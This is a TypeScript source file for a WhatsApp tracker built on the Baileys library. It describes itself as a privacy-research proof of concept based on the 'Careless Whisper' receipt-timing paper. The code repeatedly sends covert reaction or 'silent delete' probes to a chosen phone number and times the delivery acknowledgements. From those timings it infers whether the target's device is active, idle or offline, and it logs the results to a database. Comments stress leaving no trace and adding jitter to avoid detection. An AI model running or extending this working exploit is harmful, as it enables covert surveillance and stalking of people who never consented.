import '@whiskeysockets/baileys';
import { WASocket, proto } from '@whiskeysockets/baileys';
import { config } from './config';
import { RttAnalyzer, StateAnalysisResult } from './services/rttAnalyzer';
import * as db from './services/database';

/**
 * Probe method types
 * - 'reaction': Reaction probe (sends reaction to non-existent message) - DEFAULT
 * - 'delete': Silent delete probe (sends delete request for non-existent message)
 */
export type ProbeMethod = 'reaction' | 'delete';

/**
 * Logger utility for debug and normal mode
 */
class TrackerLogger {
    private isDebugMode: boolean;

    constructor(debugMode: boolean = false) {
        this.isDebugMode = debugMode;
    }

    setDebugMode(enabled: boolean) {
        this.isDebugMode = enabled;
    }

    debug(...args: unknown[]) {
        if (this.isDebugMode) {
            console.log(...args);
        }
    }

    info(...args: unknown[]) {
        console.log(...args);
    }

    error(...args: unknown[]) {
        console.error(...args);
    }

    formatDeviceState(jid: string, rtt: number, avgRtt: number, median: number, threshold: number, state: string) {
        const stateColor = state === 'Online' ? '🟢' : state === 'Standby' ? '🟡' : state === 'OFFLINE' ? '🔴' : '⚪';
        const timestamp = new Date().toLocaleTimeString('it-IT');

        // Box width is 64 characters, inner content is 62 characters (excluding ║ on both sides)
        const boxWidth = 62;

        const header = `${stateColor} Device Status Update - ${timestamp}`;
        const jidLine = `JID:        ${jid}`;
        const statusLine = `Status:     ${state}`;
        const rttLine = `RTT:        ${rtt}ms`;
        const avgLine = `Avg (${config.recentRttCount}):    ${avgRtt.toFixed(0)}ms`;
        const medianLine = `Median:     ${median.toFixed(0)}ms`;
        const thresholdLine = `Threshold:  ${threshold.toFixed(0)}ms`;

        console.log(`\n╔════════════════════════════════════════════════════════════════╗`);
        console.log(`║ ${header.padEnd(boxWidth)} ║`);
        console.log(`╠════════════════════════════════════════════════════════════════╣`);
        console.log(`║ ${jidLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${statusLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${rttLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${avgLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${medianLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${thresholdLine.padEnd(boxWidth)} ║`);
        console.log(`╚════════════════════════════════════════════════════════════════╝\n`);
    }
}

const trackerLogger = new TrackerLogger();

/**
 * Metrics tracked per device for activity monitoring
 */
interface DeviceMetrics {
    rttHistory: number[];      // Historical RTT measurements (up to deviceHistoryLimit)
    recentRtts: number[];      // Recent RTTs for moving average (last recentRttCount)
    state: string;             // Current device state (Online/Standby/Calibrating/OFFLINE)
    lastRtt: number;           // Most recent RTT measurement
    lastUpdate: number;        // Timestamp of last update
    consecutiveTimeouts: number; // Track consecutive timeouts for offline detection
}

/**
 * WhatsAppTracker - Monitors messaging app user activity using RTT-based analysis
 *
 * This class implements a privacy research proof-of-concept that demonstrates
 * how messaging apps can leak user activity information through network timing.
 *
 * The tracker sends probe messages and measures Round-Trip Time (RTT) to detect
 * when a user's device is actively in use vs. in standby mode.
 *
 * Works with WhatsApp, Signal, and similar messaging platforms.
 *
 * Based on research: "Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users"
 * by Gegenhuber et al., University of Vienna & SBA Research
 */
export class WhatsAppTracker {
    private sock: WASocket;
    private targetJid: string;
    private trackedJids: Set<string> = new Set(); // Multi-device support
    private isTracking: boolean = false;
    private deviceMetrics: Map<string, DeviceMetrics> = new Map();
    private rttAnalyzer: RttAnalyzer; // Centralized RTT analyzer with caching
    private probeStartTimes: Map<string, number> = new Map();
    private probeTimeouts: Map<string, NodeJS.Timeout> = new Map();
    private lastPresence: string | null = null;
    private sessionId: number | null = null; // Database session ID
    private lastLoggedState: string = ''; // Track state changes for logging
    public onUpdate?: (data: unknown) => void;

    // Store event listener references for proper cleanup (memory leak fix)
    private messagesUpdateListener: ((updates: { key: proto.IMessageKey, update: Partial<proto.IWebMessageInfo> }[]) => void) | null = null;
    private presenceUpdateListener: ((update: { id: string, presences: { [participant: string]: { lastKnownPresence: string } } }) => void) | null = null;
    private rawReceiptListener: ((node: unknown) => void) | null = null;

    // Probe method selection (per-contact)
    private probeMethod: ProbeMethod = 'reaction';

    constructor(sock: WASocket, targetJid: string, debugMode: boolean = false, sessionId?: number, probeMethod: ProbeMethod = 'reaction') {
        this.sock = sock;
        this.targetJid = targetJid;
        this.trackedJids.add(targetJid);
        this.rttAnalyzer = new RttAnalyzer();
        this.sessionId = sessionId ?? null;
        this.probeMethod = probeMethod;
        trackerLogger.setDebugMode(debugMode);
    }

    /**
     * Set the probe method for this tracker
     * @param method 'reaction' or 'delete'
     */
    public setProbeMethod(method: ProbeMethod): void {
        this.probeMethod = method;
        trackerLogger.info(`\n🔄 [${this.targetJid}] Probe method changed to: ${method === 'delete' ? 'Delete (silent)' : 'Reaction'}\n`);
    }

    /**
     * Get the current probe method
     */
    public getProbeMethod(): ProbeMethod {
        return this.probeMethod;
    }

    /**
     * Start tracking the target user's activity
     * Sets up event listeners for message receipts and presence updates
     */
    public async startTracking() {
        if (this.isTracking) return;
        this.isTracking = true;
        trackerLogger.info(`\n✅ Tracking started for ${this.targetJid}\n`);

        // Create and store event listener references for cleanup
        this.messagesUpdateListener = (updates) => {
            for (const update of updates) {
                const remoteJid = update.key.remoteJid;

                // Accept ACKs from both main JID and LID, but associate with main target
                // WhatsApp may return ACKs with LID even when we send to @s.whatsapp.net
                // The important thing is that it's fromMe (our probe) and directed at our target
                if (remoteJid && update.key.fromMe) {
                    // Check if this matches our target (direct or via LID)
                    const isMainTarget = this.trackedJids.has(remoteJid);
                    const isLidForTarget = remoteJid.endsWith('@lid');

                    if (isMainTarget || isLidForTarget) {
                        // Always use the main targetJid for metrics, not the LID
                        // This ensures all RTT data goes to the same device entry
                        this.analyzeUpdate(update, this.targetJid);
                    }
                }
            }
        };

        this.presenceUpdateListener = (update) => {
            trackerLogger.debug('[PRESENCE] Raw update received:', JSON.stringify(update, null, 2));

            if (update.presences) {
                for (const [jid, presenceData] of Object.entries(update.presences)) {
                    if (presenceData && presenceData.lastKnownPresence) {
                        // Track multi-device JIDs (including LID)
                        this.trackedJids.add(jid);
                        trackerLogger.debug(`[MULTI-DEVICE] Added JID to tracking: ${jid}`);

                        this.lastPresence = presenceData.lastKnownPresence;
                        trackerLogger.debug(`[PRESENCE] Stored presence from ${jid}: ${this.lastPresence}`);
                        break;
                    }
                }
            }
        };

        // Listen for message updates (receipts)
        this.sock.ev.on('messages.update', this.messagesUpdateListener);

        // Listen for presence updates
        this.sock.ev.on('presence.update', this.presenceUpdateListener);

        // Listen for raw receipts to catch 'inactive' type which Baileys ignores
        // This prevents false offline status when device is in doze/standby mode
        this.rawReceiptListener = (node: unknown) => {
            this.handleRawReceipt(node);
        };
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        (this.sock.ws as any).on('CB:receipt', this.rawReceiptListener);

        // Subscribe to presence updates
        try {
            await this.sock.presenceSubscribe(this.targetJid);
            trackerLogger.debug(`[PRESENCE] Successfully subscribed to presence for ${this.targetJid}`);
            trackerLogger.debug(`[MULTI-DEVICE] Currently tracking JIDs: ${Array.from(this.trackedJids).join(', ')}`);
        } catch (err) {
            trackerLogger.debug('[PRESENCE] Error subscribing to presence:', err);
        }

        // Send initial state update
        if (this.onUpdate) {
            this.onUpdate({
                devices: [],
                deviceCount: this.trackedJids.size,
                presence: this.lastPresence,
                median: 0,
                threshold: 0
            });
        }

        // IMPORTANT: Wait before starting probe loop
        // This gives Baileys time to establish/refresh E2EE sessions with the target
        // Without this delay, probes may use stale sessions and fail delivery
        console.log('[TRACKER] Waiting 2s for Baileys to establish sessions...');
        await new Promise(resolve => setTimeout(resolve, 2000));

        // Start the probe loop
        this.probeLoop();
    }

    private async probeLoop() {
        while (this.isTracking) {
            try {
                await this.sendProbe();
            } catch (err) {
                trackerLogger.error('[PROBE ERROR] Error in probe loop:', err);
            }
            // Add jitter to probe interval to avoid detection patterns
            const jitter = Math.floor(Math.random() * 100);
            const delay = config.probeInterval.default + jitter;
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    /**
     * Send a probe message to measure RTT
     * Dispatches to the appropriate probe method based on probeMethod setting
     */
    private async sendProbe() {
        if (this.probeMethod === 'delete') {
            await this.sendDeleteProbe();
        } else {
            await this.sendReactionProbe();
        }
    }

    /**
     * Send a delete probe - completely silent/covert method
     * Sends a "delete" command for a non-existent message
     * The target sees nothing, no notification, no trace
     */
    private async sendDeleteProbe() {
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;

            const deleteMessage = {
                delete: {
                    remoteJid: this.targetJid,
                    fromMe: true,
                    id: randomMsgId,
                }
            };

            trackerLogger.debug(`[PROBE-DELETE] Sending silent delete probe for fake message ${randomMsgId}`);
            const startTime = Date.now();
            const result = await this.sock.sendMessage(this.targetJid, deleteMessage);

            if (result?.key?.id) {
                trackerLogger.debug(`[PROBE-DELETE] Delete probe sent successfully, message ID: ${result.key.id}`);
                this.probeStartTimes.set(result.key.id, startTime);

                // Set timeout: if no CLIENT ACK within timeout, handle as potential offline
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        trackerLogger.debug(`[PROBE-DELETE TIMEOUT] No CLIENT ACK for ${result.key.id} after ${elapsedTime}ms`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);

                        // Handle timeout with consecutive timeout tracking
                        if (result.key.remoteJid) {
                            this.handleProbeTimeout(result.key.remoteJid, elapsedTime);
                        }
                    }
                }, config.probeTimeout);

                this.probeTimeouts.set(result.key.id, timeoutId);
            } else {
                trackerLogger.debug('[PROBE-DELETE ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            trackerLogger.error('[PROBE-DELETE ERROR] Failed to send delete probe message:', err);
        }
    }

    /**
     * Send a reaction probe - original method
     * Uses a reaction to a non-existent message to minimize user disruption
     */
    private async sendReactionProbe() {
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;

            // Randomize reaction emoji
            const reactions = ['👍', '❤️', '😂', '😮', '😢', '🙏', '👻', '🔥', '✨', ''];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];

            const reactionMessage = {
                react: {
                    text: randomReaction,
                    key: {
                        remoteJid: this.targetJid,
                        fromMe: false,
                        id: randomMsgId
                    }
                }
            };

            trackerLogger.debug(`[PROBE-REACTION] Sending probe with reaction "${randomReaction}" to non-existent message ${randomMsgId}`);
            const result = await this.sock.sendMessage(this.targetJid, reactionMessage);
            const startTime = Date.now();

            if (result?.key?.id) {
                trackerLogger.debug(`[PROBE-REACTION] Probe sent successfully, message ID: ${result.key.id}`);
                this.probeStartTimes.set(result.key.id, startTime);

                // Set timeout: if no CLIENT ACK within timeout, handle as potential offline
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        trackerLogger.debug(`[PROBE-REACTION TIMEOUT] No CLIENT ACK for ${result.key.id} after ${elapsedTime}ms`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);

                        // Handle timeout with consecutive timeout tracking
                        if (result.key.remoteJid) {
                            this.handleProbeTimeout(result.key.remoteJid, elapsedTime);
                        }
                    }
                }, config.probeTimeout);

                this.probeTimeouts.set(result.key.id, timeoutId);
            } else {
                trackerLogger.debug('[PROBE-REACTION ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            trackerLogger.error('[PROBE-REACTION ERROR] Failed to send probe message:', err);
        }
    }

    /**
     * Analyze message update and calculate RTT
     * @param update Message update from WhatsApp
     * @param overrideJid Optional JID to use instead of the one in the update (for LID consolidation)
     */
    private analyzeUpdate(update: { key: proto.IMessageKey, update: Partial<proto.IWebMessageInfo> }, overrideJid?: string) {
        const status = update.update.status;
        const msgId = update.key.id;
        // Use override JID if provided (consolidates LID to main target)
        const fromJid = overrideJid || update.key.remoteJid;

        if (!msgId || !fromJid) return;

        trackerLogger.debug(`[TRACKING] Message Update - ID: ${msgId}, JID: ${fromJid}, Status: ${status} (${this.getStatusName(status)})`);

        // Only CLIENT ACK (3) means device is online and received the message
        // SERVER ACK (2) only means server received it, not the device
        if (status === 3) { // CLIENT ACK
            const startTime = this.probeStartTimes.get(msgId);

            if (startTime) {
                const rtt = Date.now() - startTime;
                trackerLogger.debug(`[TRACKING] ✅ CLIENT ACK received for ${msgId} from ${fromJid}, RTT: ${rtt}ms`);

                // Clear timeout
                const timeoutId = this.probeTimeouts.get(msgId);
                if (timeoutId) {
                    clearTimeout(timeoutId);
                    this.probeTimeouts.delete(msgId);
                }

                this.probeStartTimes.delete(msgId);
                this.addMeasurementForDevice(fromJid, rtt);
            } else {
                trackerLogger.debug(`[TRACKING] ⚠️ CLIENT ACK for ${msgId} from ${fromJid} but no start time found (not our probe or already processed)`);
            }
        }
    }

    /**
     * Handle raw receipt nodes directly from the websocket
     * This is necessary because Baileys ignores receipts with type="inactive"
     * Inactive receipts indicate the device received the message but is in doze/standby mode
     */
    private handleRawReceipt(node: unknown) {
        try {
            // Type guard for the node structure
            const receiptNode = node as { attrs?: { type?: string; id?: string; from?: string } };
            const attrs = receiptNode?.attrs;

            if (!attrs) return;

            // We only care about 'inactive' receipts here - other types are handled by Baileys
            if (attrs.type === 'inactive') {
                trackerLogger.debug(`[RAW RECEIPT] Received inactive receipt: ${JSON.stringify(attrs)}`);

                const msgId = attrs.id;
                const fromJid = attrs.from;

                if (!msgId || !fromJid) return;

                // Check if this is from our target (direct or via LID)
                const isMainTarget = this.trackedJids.has(fromJid);
                const isLidForTarget = fromJid.endsWith('@lid');

                if (isMainTarget || isLidForTarget) {
                    // Process as a valid response - device is in standby but responded
                    const startTime = this.probeStartTimes.get(msgId);

                    if (startTime) {
                        const rtt = Date.now() - startTime;
                        trackerLogger.debug(`[TRACKING] ✅ INACTIVE receipt for ${msgId} from ${fromJid}, RTT: ${rtt}ms (device in doze mode)`);

                        // Clear timeout
                        const timeoutId = this.probeTimeouts.get(msgId);
                        if (timeoutId) {
                            clearTimeout(timeoutId);
                            this.probeTimeouts.delete(msgId);
                        }

                        this.probeStartTimes.delete(msgId);
                        // Use main target JID for metrics consolidation
                        this.addMeasurementForDevice(this.targetJid, rtt);
                    }
                }
            }
        } catch (err) {
            trackerLogger.debug(`[RAW RECEIPT] Error handling receipt:`, err);
        }
    }

    private getStatusName(status: number | null | undefined): string {
        switch (status) {
            case 0: return 'ERROR';
            case 1: return 'PENDING';
            case 2: return 'SERVER_ACK';
            case 3: return 'DELIVERY_ACK';
            case 4: return 'READ';
            case 5: return 'PLAYED';
            default: return 'UNKNOWN';
        }
    }

    /**
     * Handle probe timeout - improved offline detection with consecutive timeouts
     * Requires 3 consecutive timeouts before marking as OFFLINE to reduce false positives
     * @param jid Device JID
     * @param timeout Time elapsed before timeout
     */
    private handleProbeTimeout(jid: string, timeout: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: 'Calibrating...',
                lastRtt: timeout,
                lastUpdate: Date.now(),
                consecutiveTimeouts: 1
            });
        } else {
            const metrics = this.deviceMetrics.get(jid)!;
            metrics.consecutiveTimeouts++;
            metrics.lastRtt = timeout;
            metrics.lastUpdate = Date.now();

            // Only mark as OFFLINE after multiple consecutive timeouts
            // This prevents false positives from network hiccups
            if (metrics.consecutiveTimeouts >= 3) {
                const wasOffline = metrics.state === 'OFFLINE';
                metrics.state = 'OFFLINE';
                trackerLogger.info(`\n🔴 Device ${jid} marked as OFFLINE (${metrics.consecutiveTimeouts} consecutive timeouts)\n`);

                // Log OFFLINE event to database - ONLY if not already offline
                if (this.sessionId && !wasOffline) {
                    try {
                        db.logEvent({
                            sessionId: this.sessionId,
                            jid: this.targetJid,
                            eventType: 'offline',
                            rttValue: timeout,
                            state: 'OFFLINE',
                            deviceJid: jid
                        });
                        this.lastLoggedState = 'OFFLINE';
                    } catch (err) {
                        trackerLogger.debug('[DATABASE] Error logging offline event:', err);
                    }
                }
            } else {
                trackerLogger.debug(`[DEVICE ${jid}] Timeout ${metrics.consecutiveTimeouts}/3 - not marking offline yet`);
            }
        }

        this.sendUpdate();
    }

    /**
     * Add RTT measurement for a specific device and update its state
     * @param jid Device JID
     * @param rtt Round-trip time in milliseconds
     */
    private addMeasurementForDevice(jid: string, rtt: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: 'Calibrating...',
                lastRtt: rtt,
                lastUpdate: Date.now(),
                consecutiveTimeouts: 0
            });
        }

        const metrics = this.deviceMetrics.get(jid)!;

        // Reset consecutive timeouts since we got a response
        metrics.consecutiveTimeouts = 0;

        // Process measurements within reasonable range
        if (rtt <= config.offlineThreshold) {
            // 1. Add to device's recent RTTs for moving average
            metrics.recentRtts.push(rtt);
            if (metrics.recentRtts.length > config.recentRttCount) {
                metrics.recentRtts.shift();
            }

            // 2. Add to device's history for calibration
            metrics.rttHistory.push(rtt);
            if (metrics.rttHistory.length > config.deviceHistoryLimit) {
                metrics.rttHistory.shift();
            }

            // 3. Add to global RTT analyzer (centralized with caching)
            this.rttAnalyzer.addMeasurement(rtt);

            metrics.lastRtt = rtt;
            metrics.lastUpdate = Date.now();

            // Determine new state based on RTT using the analyzer
            this.determineDeviceState(jid);
        } else {
            // High RTT but got a response - device is slow but not offline
            trackerLogger.debug(`[DEVICE ${jid}] High RTT (${rtt}ms) but device responded - marking as Standby`);
            metrics.state = 'Standby';
            metrics.lastRtt = rtt;
            metrics.lastUpdate = Date.now();
        }

        this.sendUpdate();
    }

    /**
     * Determine device state (Online/Standby/OFFLINE) based on RTT analysis
     * Uses the centralized RttAnalyzer for efficient cached calculations
     * @param jid Device JID
     */
    private determineDeviceState(jid: string) {
        const metrics = this.deviceMetrics.get(jid);
        if (!metrics) return;

        // Use the RTT analyzer to determine state
        const analysis: StateAnalysisResult = this.rttAnalyzer.determineState(
            metrics.recentRtts,
            metrics.lastRtt,
            metrics.state
        );

        const previousState = metrics.state;
        metrics.state = analysis.state;

        // Log RTT measurement to database
        if (this.sessionId) {
            try {
                db.logEvent({
                    sessionId: this.sessionId,
                    jid: this.targetJid,
                    eventType: 'rtt',
                    rttValue: metrics.lastRtt,
                    avgRtt: analysis.movingAvg,
                    medianRtt: analysis.median,
                    threshold: analysis.threshold,
                    state: analysis.state,
                    deviceJid: jid
                });

                // Log state change if different from previous
                if (previousState !== analysis.state && analysis.state !== 'Calibrating...') {
                    const eventType = analysis.state.toLowerCase() as 'online' | 'offline' | 'standby';
                    db.logEvent({
                        sessionId: this.sessionId,
                        jid: this.targetJid,
                        eventType,
                        state: analysis.state,
                        deviceJid: jid
                    });
                    this.lastLoggedState = analysis.state;
                }
            } catch (err) {
                trackerLogger.debug('[DATABASE] Error logging event:', err);
            }
        }

        // Normal mode: Formatted output
        trackerLogger.formatDeviceState(
            jid,
            metrics.lastRtt,
            analysis.movingAvg,
            analysis.median,
            analysis.threshold,
            metrics.state
        );

        // Debug mode: Additional debug information
        trackerLogger.debug(`[DEBUG] RTT History length: ${metrics.rttHistory.length}, Global History: ${this.rttAnalyzer.getHistorySize()}`);
    }

    /**
     * Send update to client with current tracking data
     */
    private sendUpdate() {
        // Build devices array
        const devices = Array.from(this.deviceMetrics.entries()).map(([jid, metrics]) => ({
            jid,
            state: metrics.state,
            rtt: metrics.lastRtt,
            avg: metrics.recentRtts.length > 0
                ? metrics.recentRtts.reduce((a: number, b: number) => a + b, 0) / metrics.recentRtts.length
                : 0
        }));

        // Get global stats from analyzer (uses caching for performance)
        const globalMedian = this.rttAnalyzer.getCachedMedian() || this.rttAnalyzer.calculateMedian();
        const globalThreshold = this.rttAnalyzer.getCachedThreshold() || this.rttAnalyzer.calculateThreshold();

        const data = {
            devices,
            deviceCount: this.trackedJids.size,
            presence: this.lastPresence,
            // Global stats for charts
            median: globalMedian,
            threshold: globalThreshold
        };

        if (this.onUpdate) {
            this.onUpdate(data);
        }
    }

    /**
     * Get profile picture URL for the target user
     * @returns Profile picture URL or null if not available
     */
    public async getProfilePicture() {
        try {
            return await this.sock.profilePictureUrl(this.targetJid, 'image');
        } catch {
            return null;
        }
    }

    /**
     * Stop tracking and clean up resources
     * Properly removes event listeners to prevent memory leaks
     * Clears all tracking state to prevent pollution across sessions
     */
    public stopTracking() {
        this.isTracking = false;

        // Remove event listeners to prevent memory leaks
        if (this.messagesUpdateListener) {
            this.sock.ev.off('messages.update', this.messagesUpdateListener);
            this.messagesUpdateListener = null;
        }

        if (this.presenceUpdateListener) {
            this.sock.ev.off('presence.update', this.presenceUpdateListener);
            this.presenceUpdateListener = null;
        }

        // Remove raw receipt listener
        if (this.rawReceiptListener) {
            try {
                // eslint-disable-next-line @typescript-eslint/no-explicit-any
                (this.sock.ws as any).off('CB:receipt', this.rawReceiptListener);
            } catch {
                // Websocket might already be closed
            }
            this.rawReceiptListener = null;
        }

        // Clear all pending timeouts
        for (const timeoutId of this.probeTimeouts.values()) {
            clearTimeout(timeoutId);
        }
        this.probeTimeouts.clear();
        this.probeStartTimes.clear();

        // Reset the RTT analyzer
        this.rttAnalyzer.reset();

        // CRITICAL FIX: Clear device metrics to prevent state pollution
        // Without this, old OFFLINE states and consecutiveTimeouts persist
        // when restarting tracking on the same JID
        this.deviceMetrics.clear();

        // Clear tracked JIDs to prevent multi-device JID pollution
        // Keep only the original target JID
        this.trackedJids.clear();
        this.trackedJids.add(this.targetJid);

        // Reset presence to prevent stale data
        this.lastPresence = null;

        trackerLogger.info(`\n⏹️ Tracking stopped for ${this.targetJid}\n`);
    }
}
